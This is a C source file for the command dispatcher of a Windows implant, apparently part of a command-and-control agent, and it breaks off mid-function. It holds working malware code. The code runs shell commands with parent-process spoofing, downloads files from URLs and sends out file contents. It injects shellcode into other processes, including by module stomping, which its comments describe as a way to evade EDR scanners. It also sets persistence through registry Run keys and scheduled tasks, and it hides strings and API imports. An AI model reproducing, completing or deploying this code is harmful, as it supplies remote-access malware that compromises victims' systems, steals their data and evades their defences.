/*
 * commands.c — command dispatcher.
 *
 * Supported commands:
 *   shell    — execute via cmd.exe /C, capture stdout+stderr
 *   dl       — download file from URL to disk (WinHTTP)
 *   ul       — upload file contents in result output
 *   inject   — classic shellcode injection (NtOpenProcess + NT*VM + NtCreateThread)
 *   stomp    — module stomping injection (overwrite mapped DLL .text with shellcode)
 *   ps       — list running processes (Toolhelp32)
 *   cd       — change working directory
 *   sleep    — update beacon interval
 *   kill     — self-terminate
 *   ppid     — set parent PID spoof (stored; applied on next CreateProcess)
 *   getpid   — return own PID
 *   whoami   — return hostname\username + admin status
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* PPID spoof: stored globally, applied in _CreateProcessWithPPID */
static DWORD s_ppid = 0;

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static AgentResult *MakeResult(const AgentCommand *cmd,
                                int success, int exitCode, char *output) {
    AgentResult *r = (AgentResult *)ImplantAlloc(sizeof(AgentResult));
    if (!r) return NULL;
    xsnprintf(r->cmd_id, CMD_ID_LEN, "%s", cmd->id);
    r->success   = success;
    r->exit_code = exitCode;
    r->output    = output;
    return r;
}

static AgentResult *ErrorResult(const AgentCommand *cmd, const char *msg) {
    return MakeResult(cmd, 0, -1, ImplantStrDup(msg));
}

void FreeResult(AgentResult *r) {
    if (!r) return;
    if (r->output) {
        SecureZero(r->output, strlen(r->output));
        ImplantFree(r->output);
    }
    SecureZero(r, sizeof(*r));
    ImplantFree(r);
}

/* ── PPID-spoofed CreateProcess ──────────────────────────────────────────── */

typedef BOOL (WINAPI *pfnInitializeProcThreadAttributeList)
    (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pfnUpdateProcThreadAttribute)
    (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID (WINAPI *pfnDeleteProcThreadAttributeList)
    (LPPROC_THREAD_ATTRIBUTE_LIST);

static BOOL _CreateProcessWithPPID(const char *cmd,
                                    HANDLE *hProcOut, HANDLE *hThreadOut,
                                    HANDLE hStdOut, HANDLE hStdErr) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.StartupInfo.cb      = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdInput  = NULL;
    si.StartupInfo.hStdOutput = hStdOut;
    si.StartupInfo.hStdError  = hStdErr;

    BOOL usePPID = (s_ppid != 0);
    SIZE_T attrSize = 0;

    pfnInitializeProcThreadAttributeList pInit = NULL;
    pfnUpdateProcThreadAttribute          pUpd  = NULL;
    pfnDeleteProcThreadAttributeList      pDel  = NULL;

    if (usePPID) {
        pInit = (pfnInitializeProcThreadAttributeList)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("InitializeProcThreadAttributeList"));
        pUpd  = (pfnUpdateProcThreadAttribute)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("UpdateProcThreadAttribute"));
        pDel  = (pfnDeleteProcThreadAttributeList)(FARPROC)
            g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")),
                           OBFSTR("DeleteProcThreadAttributeList"));

        if (pInit && pUpd && pDel) {
            pInit(NULL, 0, 1, &attrSize);
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ImplantAlloc(attrSize);
            if (si.lpAttributeList) {
                pInit(si.lpAttributeList, 0, 1, &attrSize);
                HANDLE hParent = NULL;
                NtOpenProc(s_ppid, PROCESS_CREATE_PROCESS, &hParent);
                if (hParent) {
                    pUpd(si.lpAttributeList, 0,
                         0x00020000 /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */,
                         &hParent, sizeof(HANDLE), NULL, NULL);
                }
            }
        } else {
            usePPID = FALSE;
        }
    }

    WCHAR wcmd[CMD_OUTPUT_MAX / 4];
    StrToWstr(cmd, wcmd, CMD_OUTPUT_MAX / 4);

    DWORD flags = CREATE_NO_WINDOW;
    if (usePPID && si.lpAttributeList) flags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                              flags, NULL, NULL,
                              (LPSTARTUPINFOW)&si, &pi);
    if (usePPID && si.lpAttributeList) {
        if (pDel) pDel(si.lpAttributeList);
        ImplantFree(si.lpAttributeList);
    }

    if (ok) {
        if (hProcOut)   *hProcOut   = pi.hProcess;
        if (hThreadOut) *hThreadOut = pi.hThread;
    }
    return ok;
}

/* ── shell ───────────────────────────────────────────────────────────────── */

static AgentResult *CmdShell(const AgentCommand *cmd) {
    char *cmdStr = JsonGetStr(cmd->args_json, "cmd");
    if (!cmdStr || !cmdStr[0]) {
        ImplantFree(cmdStr);
        return ErrorResult(cmd, "missing cmd argument");
    }

    /* Build: cmd.exe /C <cmdStr> */
    char full[4096];
    xsnprintf(full, sizeof(full), "cmd.exe /C %s", cmdStr);
    ImplantFree(cmdStr);

    /* Pipe for stdout+stderr */
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return ErrorResult(cmd, "CreatePipe failed");

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    HANDLE hProc = NULL, hThread = NULL;
    BOOL ok = _CreateProcessWithPPID(full, &hProc, &hThread, hWritePipe, hWritePipe);
    CloseHandle(hWritePipe);

    if (!ok) {
        CloseHandle(hReadPipe);
        return ErrorResult(cmd, "CreateProcess failed");
    }
    CloseHandle(hThread);

    /* Read output */
    char *out = (char *)ImplantAlloc(CMD_OUTPUT_MAX);
    DWORD totalRead = 0, read = 0;
    if (out) {
        while (ReadFile(hReadPipe, out + totalRead,
                         CMD_OUTPUT_MAX - totalRead - 1, &read, NULL) && read > 0) {
            totalRead += read;
            if (totalRead >= CMD_OUTPUT_MAX - 1) break;
        }
        out[totalRead] = '\0';
    }
    CloseHandle(hReadPipe);

    DWORD exitCode = 0;
    WaitForSingleObject(hProc, 30000);
    GetExitCodeProcess(hProc, &exitCode);
    CloseHandle(hProc);

    return MakeResult(cmd, exitCode == 0 ? 1 : 0, (int)exitCode, out);
}

/* ── ps (process list) ───────────────────────────────────────────────────── */

static AgentResult *CmdPS(const AgentCommand *cmd) {
    typedef HANDLE (WINAPI *pfnCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI *pfnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *pfnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);

    HMODULE k32 = g_GetModuleHandleA(OBFSTR("kernel32.dll"));
    pfnCreateToolhelp32Snapshot pSnap =
        (pfnCreateToolhelp32Snapshot)(FARPROC)g_GetProcAddress(k32, OBFSTR("CreateToolhelp32Snapshot"));
    pfnProcess32FirstW pFirst =
        (pfnProcess32FirstW)(FARPROC)g_GetProcAddress(k32, OBFSTR("Process32FirstW"));
    pfnProcess32NextW pNext =
        (pfnProcess32NextW)(FARPROC)g_GetProcAddress(k32, OBFSTR("Process32NextW"));

    if (!pSnap || !pFirst || !pNext)
        return ErrorResult(cmd, "Toolhelp32 unavailable");

    HANDLE snap = pSnap(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return ErrorResult(cmd, "CreateToolhelp32Snapshot failed");

    char *out = (char *)ImplantAlloc(CMD_OUTPUT_MAX);
    if (!out) { CloseHandle(snap); return ErrorResult(cmd, "alloc failed"); }

    int pos = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (pFirst(snap, &pe)) {
        do {
            char name[256] = {0};
            WstrToStr(pe.szExeFile, name, sizeof(name));
            pos += xsnprintf(out + pos, CMD_OUTPUT_MAX - pos,
                             "%5lu  %s\n", (unsigned long)pe.th32ProcessID, name);
        } while (pNext(snap, &pe));
    }
    CloseHandle(snap);
    out[pos] = '\0';
    return MakeResult(cmd, 1, 0, out);
}

/* ── cd ──────────────────────────────────────────────────────────────────── */

static AgentResult *CmdCD(const AgentCommand *cmd) {
    char *path = JsonGetStr(cmd->args_json, "path");
    if (!path) return ErrorResult(cmd, "missing path");

    WCHAR wpath[PATH_MAX_C];
    StrToWstr(path, wpath, PATH_MAX_C);
    ImplantFree(path);

    BOOL ok = SetCurrentDirectoryW(wpath);
    if (!ok) return ErrorResult(cmd, "SetCurrentDirectory failed");

    WCHAR cwd[PATH_MAX_C] = {0};
    GetCurrentDirectoryW(PATH_MAX_C, cwd);
    char cwdA[PATH_MAX_C] = {0};
    WstrToStr(cwd, cwdA, PATH_MAX_C);
    return MakeResult(cmd, 1, 0, ImplantStrDup(cwdA));
}

/* ── sleep ───────────────────────────────────────────────────────────────── */

static AgentResult *CmdSleep(const AgentCommand *cmd) {
    char *s = JsonGetStr(cmd->args_json, "interval");
    char *j = JsonGetStr(cmd->args_json, "jitter");

    if (s) {
        int secs = 0;
        for (const char *p = s; *p >= '0' && *p <= '9'; p++)
            secs = secs * 10 + (*p - '0');
        g_agent.base_interval = secs;
        ImplantFree(s);
    }
    if (j) {
        int pct = 0;
        for (const char *p = j; *p >= '0' && *p <= '9'; p++)
            pct = pct * 10 + (*p - '0');
        g_agent.jitter_pct = pct;
        ImplantFree(j);
    }
    return MakeResult(cmd, 1, 0, ImplantStrDup("ok"));
}

/* ── kill ────────────────────────────────────────────────────────────────── */

static AgentResult *CmdKill(const AgentCommand *cmd) {
    (void)cmd;
    ExitProcess(0);
    return NULL;
}

/* ── ppid ────────────────────────────────────────────────────────────────── */

static AgentResult *CmdPPID(const AgentCommand *cmd) {
    char *p = JsonGetStr(cmd->args_json, "pid");
    if (!p) return ErrorResult(cmd, "missing pid");
    DWORD pid = 0;
    for (const char *c = p; *c >= '0' && *c <= '9'; c++) pid = pid * 10 + (*c - '0');
    s_ppid = pid;
    ImplantFree(p);
    return MakeResult(cmd, 1, 0, ImplantStrDup("ok"));
}

/* ── getpid ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdGetPID(const AgentCommand *cmd) {
    char buf[32];
    xsnprintf(buf, sizeof(buf), "%lu", (unsigned long)GetCurrentProcessId());
    return MakeResult(cmd, 1, 0, ImplantStrDup(buf));
}

/* ── whoami ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdWhoami(const AgentCommand *cmd) {
    char buf[512];
    xsnprintf(buf, sizeof(buf), "%s\\%s (admin=%s)",
              g_agent.hostname, g_agent.username,
              g_agent.is_admin ? "yes" : "no");
    return MakeResult(cmd, 1, 0, ImplantStrDup(buf));
}

/* ── inject ──────────────────────────────────────────────────────────────── */

static AgentResult *CmdInject(const AgentCommand *cmd) {
    char *pidStr  = JsonGetStr(cmd->args_json, "pid");
    char *scB64   = JsonGetStr(cmd->args_json, "shellcode");
    if (!pidStr || !scB64) {
        ImplantFree(pidStr); ImplantFree(scB64);
        return ErrorResult(cmd, "missing pid or shellcode");
    }

    DWORD pid = 0;
    for (const char *p = pidStr; *p >= '0' && *p <= '9'; p++) pid = pid * 10 + (*p - '0');
    ImplantFree(pidStr);

    /* Decode base64 shellcode */
    int scB64Len = (int)strlen(scB64);
    BYTE *sc = (BYTE *)ImplantAlloc(scB64Len);
    if (!sc) { ImplantFree(scB64); return ErrorResult(cmd, "alloc failed"); }
    int scLen = Base64Decode(scB64, scB64Len, sc, scB64Len);
    ImplantFree(scB64);
    if (scLen <= 0) { ImplantFree(sc); return ErrorResult(cmd, "base64 decode failed"); }

    HANDLE hProc = NULL;
    NTSTATUS st = NtOpenProc(pid, PROCESS_ALL_ACCESS, &hProc);
    if (st != 0 || !hProc) {
        ImplantFree(sc);
        return ErrorResult(cmd, "NtOpenProcess failed");
    }

    PVOID remote = NULL;
    st = NtAlloc(hProc, &remote, (SIZE_T)scLen, PAGE_READWRITE);
    if (st != 0) { ImplantFree(sc); CloseHandle(hProc); return ErrorResult(cmd, "NtAlloc failed"); }

    st = NtWrite(hProc, remote, sc, (SIZE_T)scLen);
    ImplantFree(sc);
    if (st != 0) { NtFree(hProc, remote); CloseHandle(hProc); return ErrorResult(cmd, "NtWrite failed"); }

    ULONG old = 0;
    st = NtProtect(hProc, remote, (SIZE_T)scLen, PAGE_EXECUTE_READ, &old);
    if (st != 0) { NtFree(hProc, remote); CloseHandle(hProc); return ErrorResult(cmd, "NtProtect failed"); }

    HANDLE hThread = NULL;
    st = NtCreateThread(hProc, remote, NULL, &hThread);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);

    if (st != 0) return ErrorResult(cmd, "NtCreateThread failed");
    return MakeResult(cmd, 1, 0, ImplantStrDup("injected"));
}

/* ── ul (upload file → exfil its contents) ──────────────────────────────── */

static AgentResult *CmdUpload(const AgentCommand *cmd) {
    char *path = JsonGetStr(cmd->args_json, "path");
    if (!path) return ErrorResult(cmd, "missing path");

    WCHAR wpath[PATH_MAX_C];
    StrToWstr(path, wpath, PATH_MAX_C);
    ImplantFree(path);

    HANDLE hFile = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return ErrorResult(cmd, "file open failed");

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > (4 * 1024 * 1024)) {
        CloseHandle(hFile);
        return ErrorResult(cmd, "file too large or invalid");
    }

    BYTE *raw = (BYTE *)ImplantAlloc(fileSize);
    if (!raw) { CloseHandle(hFile); return ErrorResult(cmd, "alloc failed"); }

    DWORD read = 0;
    ReadFile(hFile, raw, fileSize, &read, NULL);
    CloseHandle(hFile);

    /* base64-encode file content as output */
    int b64cap = (fileSize * 4 / 3) + 8;
    char *b64 = (char *)ImplantAlloc(b64cap);
    if (!b64) { ImplantFree(raw); return ErrorResult(cmd, "alloc failed"); }
    Base64Encode(raw, (int)read, b64, b64cap);
    ImplantFree(raw);
    return MakeResult(cmd, 1, 0, b64);
}

/* ── dl (download URL to disk) ───────────────────────────────────────────── */

static AgentResult *CmdDownload(const AgentCommand *cmd) {
    char *url  = JsonGetStr(cmd->args_json, "url");
    char *dest = JsonGetStr(cmd->args_json, "dest");
    if (!url || !dest) {
        ImplantFree(url); ImplantFree(dest);
        return ErrorResult(cmd, "missing url or dest");
    }

    DWORD len = 0;
    char *data = HttpPost_GET(url, &len);
    ImplantFree(url);
    if (!data) { ImplantFree(dest); return ErrorResult(cmd, "download failed"); }

    WCHAR wdest[PATH_MAX_C];
    StrToWstr(dest, wdest, PATH_MAX_C);
    ImplantFree(dest);

    HANDLE hFile = CreateFileW(wdest, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ImplantFree(data);
        return ErrorResult(cmd, "file create failed");
    }

    DWORD written = 0;
    WriteFile(hFile, data, len, &written, NULL);
    CloseHandle(hFile);
    ImplantFree(data);

    char out[64];
    xsnprintf(out, sizeof(out), "wrote %lu bytes", (unsigned long)written);
    return MakeResult(cmd, 1, 0, ImplantStrDup(out));
}

/*
 * HttpPost_GET — reuse WinHTTP stack for a plain GET request.
 * Declared here; beacon.c owns the session logic but we replicate a minimal
 * GET path to avoid coupling files.
 */
char *HttpPost_GET(const char *url, DWORD *outLen) {
    *outLen = 0;
    if (!pWinHttpOpen) return NULL;

    WCHAR wHost[256] = {0}, wPath[512] = {0};
    INTERNET_PORT port = 80;
    BOOL https = FALSE;

    /* reuse same ParseURL — it's static in beacon.c; duplicate inline here */
    const char *p = url;
    if (strncmp(p, "https://", 8) == 0) { https = TRUE; p += 8; port = 443; }
    else if (strncmp(p, "http://", 7) == 0) { p += 7; port = 80; }

    const char *slash = p;
    while (*slash && *slash != '/' && *slash != ':') slash++;
    char hostbuf[256] = {0};
    int hlen = (int)(slash - p); if (hlen > 255) hlen = 255;
    memcpy(hostbuf, p, hlen);
    StrToWstr(hostbuf, wHost, 256);
    if (*slash == ':') { slash++; port = 0; while (*slash>='0'&&*slash<='9'){port=port*10+(*slash-'0');slash++;} }
    if (*slash == '/') StrToWstr(slash, wPath, 512); else StrToWstr("/", wPath, 512);

    HINTERNET hSess = pWinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return NULL;

    HINTERNET hConn = pWinHttpConnect(hSess, wHost, port, 0);
    if (!hConn) { pWinHttpCloseHandle(hSess); return NULL; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = pWinHttpOpenRequest(hConn, L"GET", wPath, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSess); return NULL; }

    char *result = NULL;
    if (pWinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        pWinHttpReceiveResponse(hReq, NULL)) {
        DWORD cap = 65536, avail = 0, read = 0, total = 0;
        result = (char *)ImplantAlloc(cap);
        if (result) {
            while (pWinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
                if (total + avail + 1 > cap) {
                    cap = total + avail + 4096;
                    char *tmp = (char *)ImplantAlloc(cap);
                    if (!tmp) { ImplantFree(result); result = NULL; break; }
                    memcpy(tmp, result, total);
                    ImplantFree(result); result = tmp;
                }
                if (!pWinHttpReadData(hReq, result + total, avail, &read)) break;
                total += read;
            }
            if (result) { result[total] = '\0'; *outLen = total; }
        }
    }

    pWinHttpCloseHandle(hReq);
    pWinHttpCloseHandle(hConn);
    pWinHttpCloseHandle(hSess);
    return result;
}

/* ── stomp (module stomping injection) ───────────────────────────────────────
 *
 * Instead of allocating private RWX memory (a classic EDR IOC), we:
 *   1. Load a sacrificial DLL (e.g. xpsservices.dll) into the target process
 *      via a LoadLibrary remote-thread trick
 *   2. Parse the loaded DLL's PE header to find its .text section
 *   3. NtProtect .text → RW, NtWrite our shellcode over it, NtProtect → RX
 *   4. NtCreateThread at the start of the stomped region
 *
 * Result: shellcode executes from a region that belongs to a mapped, signed
 * DLL — no private RWX allocation visible to scanners.
 *
 * Args JSON: { "pid": N, "shellcode": "<b64>", "dll": "<optional dll name>" }
 */
static AgentResult *CmdStomp(const AgentCommand *cmd) {
    char *pidStr = JsonGetStr(cmd->args_json, "pid");
    char *scB64  = JsonGetStr(cmd->args_json, "shellcode");
    char *dllName = JsonGetStr(cmd->args_json, "dll");   /* optional */
    if (!pidStr || !scB64) {
        ImplantFree(pidStr); ImplantFree(scB64); ImplantFree(dllName);
        return ErrorResult(cmd, "missing pid or shellcode");
    }

    DWORD pid = 0;
    for (const char *p = pidStr; *p >= '0' && *p <= '9'; p++) pid = pid * 10 + (*p - '0');
    ImplantFree(pidStr);

    /* Default sacrificial DLL — small, always present on Win10+, rarely loaded */
    const char *sacDLL = (dllName && dllName[0]) ? dllName : OBFSTR("xpsservices.dll");

    /* Decode shellcode */
    int scB64Len = (int)strlen(scB64);
    BYTE *sc = (BYTE*)ImplantAlloc(scB64Len);
    if (!sc) { ImplantFree(scB64); ImplantFree(dllName); return ErrorResult(cmd, "alloc"); }
    int scLen = Base64Decode(scB64, scB64Len, sc, scB64Len);
    ImplantFree(scB64); ImplantFree(dllName);
    if (scLen <= 0) { ImplantFree(sc); return ErrorResult(cmd, "b64 decode"); }

    HANDLE hProc = NULL;
    NTSTATUS st = NtOpenProc(pid, PROCESS_ALL_ACCESS, &hProc);
    if (st != 0 || !hProc) { ImplantFree(sc); return ErrorResult(cmd, "NtOpenProcess"); }

    /* --- Step 1: load sacrificial DLL into target via LoadLibraryA remote thread --- */
    /* Allocate space for DLL path string in target */
    PVOID pathRemote = NULL;
    SIZE_T pathLen = strlen(sacDLL) + 1;
    st = NtAlloc(hProc, &pathRemote, pathLen, PAGE_READWRITE);
    if (st != 0) { CloseHandle(hProc); ImplantFree(sc); return ErrorResult(cmd, "NtAlloc path"); }
    NtWrite(hProc, pathRemote, (PVOID)sacDLL, pathLen);

    /* Get LoadLibraryA address (same in all processes — ASLR is per-boot, not per-process) */
    PVOID pLoadLib = (PVOID)g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("LoadLibraryA"));
    HANDLE hLLThread = NULL;
    NtCreateThread(hProc, pLoadLib, pathRemote, &hLLThread);
    if (hLLThread) {
        WaitForSingleObject(hLLThread, 5000);
        CloseHandle(hLLThread);
    }
    NtFree(hProc, pathRemote);

    /* --- Step 2: find the loaded DLL's base address in the target via PEB --- */
    /* Use NtQueryInformationProcess(ProcessBasicInformation) to get PEB, then
     * read InLoadOrderModuleList from target PEB.  Simplified: we use
     * EnumProcessModules on the target to find the module. */
    typedef BOOL (WINAPI *pfnEnumProcMods)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pfnGetModFileNameExA)(HANDLE, HMODULE, LPSTR, DWORD);
    HMODULE psapi = g_LoadLibraryA(OBFSTR("psapi.dll"));
    PVOID stompBase = NULL;
    DWORD stompTextSize = 0;
    DWORD stompTextRVA  = 0;

    if (psapi) {
        pfnEnumProcMods pEnum = (pfnEnumProcMods)(FARPROC)g_GetProcAddress(psapi, OBFSTR("EnumProcessModules"));
        pfnGetModFileNameExA pName = (pfnGetModFileNameExA)(FARPROC)g_GetProcAddress(psapi, OBFSTR("GetModuleFileNameExA"));

        if (pEnum && pName) {
            HMODULE mods[512]; DWORD needed = 0;
            if (pEnum(hProc, mods, sizeof(mods), &needed)) {
                int nMods = (int)(needed / sizeof(HMODULE));
                char modName[256];
                /* Convert sacDLL to lowercase for comparison */
                char sacLower[128]; int si=0;
                while (sacDLL[si] && si<127) {
                    sacLower[si] = (sacDLL[si]>='A'&&sacDLL[si]<='Z') ? sacDLL[si]+32 : sacDLL[si];
                    si++;
                }
                sacLower[si] = '\0';

                for (int i = 0; i < nMods; i++) {
                    if (!pName(hProc, mods[i], modName, sizeof(modName))) continue;
                    /* Check if basename matches */
                    char *base2 = modName + strlen(modName);
                    while (base2 > modName && base2[-1] != '\\' && base2[-1] != '/') base2--;
                    /* lowercase compare */
                    char baseLow[128]; int bi=0;
                    while (base2[bi] && bi<127) {
                        baseLow[bi] = (base2[bi]>='A'&&base2[bi]<='Z') ? base2[bi]+32 : base2[bi];
                        bi++;
                    }
                    baseLow[bi]='\0';
                    if (strcmp(baseLow, sacLower) != 0) continue;

                    /* Read the PE header from target to find .text section */
                    BYTE hdrBuf[4096]; DWORD nRead = 0;
                    if (!ReadProcessMemory(hProc, mods[i], hdrBuf, sizeof(hdrBuf), (SIZE_T*)&nRead))
                        break;
                    PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(hdrBuf + ((PIMAGE_DOS_HEADER)hdrBuf)->e_lfanew);
                    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntH);
                    for (WORD s2 = 0; s2 < ntH->FileHeader.NumberOfSections; s2++) {
                        if (memcmp(sec[s2].Name, ".text", 5) == 0) {
                            stompBase      = (BYTE*)mods[i] + sec[s2].VirtualAddress;
                            stompTextRVA   = sec[s2].VirtualAddress;
                            stompTextSize  = sec[s2].Misc.VirtualSize;
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }

    if (!stompBase) {
        CloseHandle(hProc);
        ImplantFree(sc);
        return ErrorResult(cmd, "could not locate DLL .text in target");
    }

    if ((DWORD)scLen > stompTextSize) {
        CloseHandle(hProc);
        ImplantFree(sc);
        return ErrorResult(cmd, "shellcode larger than DLL .text section");
    }

    /* --- Step 3: NtProtect RW, write shellcode, NtProtect RX, create thread --- */
    ULONG oldProt = 0;
    st = NtProtect(hProc, stompBase, (SIZE_T)scLen, PAGE_READWRITE, &oldProt);
    if (st != 0) { CloseHandle(hProc); ImplantFree(sc); return ErrorResult(cmd, "NtProtect RW"); }

    NtWrite(hProc, stompBase, sc, (SIZE_T)scLen);
    ImplantFree(sc);

    NtProtect(hProc, stompBase, (SIZE_T)scLen, PAGE_EXECUTE_READ, &oldProt);

    HANDLE hSCThread = NULL;
    st = NtCreateThread(hProc, stompBase, NULL, &hSCThread);
    if (hSCThread) CloseHandle(hSCThread);
    CloseHandle(hProc);

    if (st != 0) return ErrorResult(cmd, "NtCreateThread failed");
    return MakeResult(cmd, 1, 0, ImplantStrDup("stomped"));
}

/* ── persist ─────────────────────────────────────────────────────────────────
 *
 * Two methods:
 *   "reg"     — HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 *               Requires: advapi32!RegOpenKeyExA + RegSetValueExA
 *   "schtask" — schtasks.exe /Create  (shell child process)
 *
 * Args JSON: { "method": "reg"|"schtask", "name": "<key/task name>",
 *              "path": "<optional exe path; defaults to own image>" }
 */
static AgentResult *CmdPersist(const AgentCommand *cmd) {
    char *method = JsonGetStr(cmd->args_json, "method");
    char *name   = JsonGetStr(cmd->args_json, "name");
    char *path   = JsonGetStr(cmd->args_json, "path");

    if (!method || !name || !name[0]) {
        ImplantFree(method); ImplantFree(name); ImplantFree(path);
        return ErrorResult(cmd, "missing method or name");
    }

    /* Resolve own executable path if not provided */
    char exePath[PATH_MAX_C] = {0};
    if (path && path[0]) {
        xsnprintf(exePath, sizeof(exePath), "%s", path);
    } else {
        WCHAR wExe[PATH_MAX_C] = {0};
        GetModuleFileNameW(NULL, wExe, PATH_MAX_C);
        WstrToStr(wExe, exePath, PATH_MAX_C);
    }
    ImplantFree(path);

    AgentResult *result = NULL;

    if (strcmp(method, "reg") == 0) {
        /* Registry Run key — dynamic advapi32 resolution (no static IAT) */
        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
        typedef LONG (WINAPI *pfnRegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD,
                                                    const BYTE *, DWORD);
        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);

        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (!adv) {
            result = ErrorResult(cmd, "advapi32 unavailable");
            goto done;
        }

        pfnRegOpenKeyExA_t  pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegOpenKeyExA"));
        pfnRegSetValueExA_t pSet   = (pfnRegSetValueExA_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegSetValueExA"));
        pfnRegCloseKey_t    pClose = (pfnRegCloseKey_t)(FARPROC)
            g_GetProcAddress(adv, OBFSTR("RegCloseKey"));

        if (!pOpen || !pSet || !pClose) {
            result = ErrorResult(cmd, "reg API unavailable");
            goto done;
        }

        HKEY hKey = NULL;
        LONG rc = pOpen((HKEY)0x80000001 /* HKCU */,
                        OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                        0, 0x0002 /* KEY_SET_VALUE */, &hKey);
        if (rc != 0 || !hKey) {
            result = ErrorResult(cmd, "RegOpenKeyEx failed");
            goto done;
        }

        rc = pSet(hKey, name, 0, 1 /* REG_SZ */,
                  (const BYTE *)exePath, (DWORD)(strlen(exePath) + 1));
        pClose(hKey);

        result = (rc == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("reg persist set"))
                           : ErrorResult(cmd, "RegSetValueEx failed");

    } else if (strcmp(method, "schtask") == 0) {
        /* Scheduled task via schtasks.exe */
        char taskCmd[PATH_MAX_C * 2];
        xsnprintf(taskCmd, sizeof(taskCmd),
                  "schtasks /Create /F /SC ONLOGON /TN \"%s\" /TR \"%s\"",
                  name, exePath);

        char full[PATH_MAX_C * 2 + 16];
        xsnprintf(full, sizeof(full), "cmd.exe /C %s", taskCmd);

        HANDLE hProc = NULL, hThr = NULL;
        BOOL ok = _CreateProcessWithPPID(full, &hProc, &hThr, NULL, NULL);
        if (ok) {
            WaitForSingleObject(hProc, 10000);
            DWORD ec = 1;
            GetExitCodeProcess(hProc, &ec);
            CloseHandle(hThr);
            CloseHandle(hProc);
            result = (ec == 0) ? MakeResult(cmd, 1, 0, ImplantStrDup("schtask persist set"))
                               : ErrorResult(cmd, "schtasks returned error");
        } else {
            result = ErrorResult(cmd, "CreateProcess failed");
        }

    } else {
        result = ErrorResult(cmd, "unknown method (use reg or schtask)");
    }

done:
    ImplantFree(method);
    ImplantFree(name);
    return result;
}

/* ── remove_persist ──────────────────────────────────────────────────────── */

static AgentResult *CmdRemovePersist(const AgentCommand *cmd) {
    char *method = JsonGetStr(cmd->args_json, "method");
    char *name   = JsonGetStr(cmd->args_json, "name");

    if (!method || !name || !name[0]) {
        ImplantFree(method); ImplantFree(name);
        return ErrorResult(cmd, "missing method or name");
    }

    AgentResult *result = NULL;

    if (strcmp(method, "reg") == 0) {
        typedef LONG (WINAPI *pfnRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
        typedef LONG (WINAPI *pfnRegDeleteValueA_t)(HKEY, LPCSTR);
        typedef LONG (WINAPI *pfnRegCloseKey_t)(HKEY);

        HMODULE adv = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (!adv) { result = ErrorResult(cmd, "advapi32 unavailable"); goto rdone; }

        pfnRegOpenKeyExA_t   pOpen  = (pfnRegOpenKeyExA_t)(FARPROC)
